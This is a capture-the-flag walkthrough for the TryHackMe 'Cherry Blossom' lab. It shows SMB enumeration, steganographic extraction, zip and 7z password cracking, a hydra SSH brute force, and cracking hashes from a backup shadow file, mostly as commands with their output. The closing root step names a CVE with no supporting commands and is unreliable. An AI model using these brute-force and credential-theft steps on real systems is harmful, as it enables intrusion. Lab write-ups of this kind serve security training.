---
title: "Cherry Blossom"
category: "tryhackme"
enrich: true
image: "cherry-blossom.png"
---

## Summary
A walkthrough of the Cherry Blossom machine involving SMB enumeration, steganography on a journal file, breaking a custom archive format, and brute-forcing SSH credentials.

## Reconnaissance
**Nmap Scan Results:**
```
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 62
139/tcp open  netbios-ssn  syn-ack ttl 62
445/tcp open  microsoft-ds syn-ack ttl 62

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (SMB: Failed to receive bytes: TIMEOUT)
|   \\10.64.149.126\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.7.6-Ubuntu)
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE
```

## Enumeration
**SMB Access:**
We found anonymous access allowed on the SMB server.
```bash
smbclient //10.64.149.126/Anonymous -N -t 900

Anonymous login successful
smb: \> ls
  journal.txt                         N  3470998  Sun Feb  9 19:20:53 2020
smb: \> get journal.txt
```

**Steganography Analysis:**
The `journal.txt` file appears to be base64 encoded. Decoding it reveals a PNG header.
```bash
cat journal.txt | base64 -d > output
file output
# output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
```

Using `stegpy`, we extract a hidden zip file.
```bash
stegpy output         
# File _journal.zip succesfully extracted from output
```

## Exploitation
**Cracking the Archive:**
The zip file header seems corrupted. Fixing the magic bytes reveals it's a valid zip.
```bash
file _journal.zip                                            
# _journal.zip: Zip archive data
```

Brute-forcing the zip password with `rockyou.txt`:
```bash
fcrackzip -uDp /usr/share/wordlists/rockyou.txt  _journal.zip
# PASSWORD FOUND!!!!: pw == september
```

Inside we find `Journal.ctz`, a 7-Zip archive. Converting to hash and cracking:
```bash
/usr/share/john/7z2john.pl Journal.ctz > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# tigerlily        (Journal.ctz)     
```

**SSH Bruteforce:**
Using the decoded wordlists from the journal logs, we brute-force the `lily` user.
```bash
hydra -l lily -P cherry-blossom.txt ssh://10.64.149.126
# [22][ssh] host: 10.64.149.126   login: lily   password: Mr.$un$hi..
```

## Privilege Escalation
**Hash Cracking:**
Found backup shadow files in `/var/backups`.
```bash
/var/backups/shadow.bak
johan:$6$zV7zbU1b...
lily:$6$3GPkY0ZP...
```

Cracking the hashes gives us `johan`'s password.
```bash
john --wordlist=cherry-blossom.txt hashes.txt
# ##scuffleboo##   (johan)     
```

**Root Access:**
Switching to `johan` and pivoting to root via CVE-2019-18364 capabilities.
```bash
lily@cherryblossom:~$ su johan
# Password: ##scuffleboo##
johan@cherryblossom:~$ cat user.txt
```